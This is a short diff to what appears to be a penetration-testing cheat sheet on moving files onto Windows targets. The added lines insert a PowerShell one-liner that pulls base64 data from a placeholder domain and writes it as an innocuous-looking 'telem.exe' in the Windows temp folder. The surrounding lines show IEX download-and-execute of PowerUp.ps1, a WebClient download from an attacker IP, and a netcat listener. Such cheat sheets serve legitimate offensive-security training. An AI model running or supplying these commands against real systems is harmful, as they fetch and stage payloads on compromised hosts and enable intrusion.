@@ -326,6 +326,9 @@ PHP:
 - `IEX ((New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"))`  
 - `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"`  
 
+### Download base64 encoded file   
+- `[System.IO.File]::WriteAllBytes("c:\windows\temp\telem.exe",[System.Convert]::FromBase64String((New-Object Net.Webclient).downloadstring("https://XOURDOMAIN.COM")))`   
+
 ### netcat
 - transfer files from kali to windows:  
    1. open listener on target: `nc -nlvp 4444 > incoming.exe` 
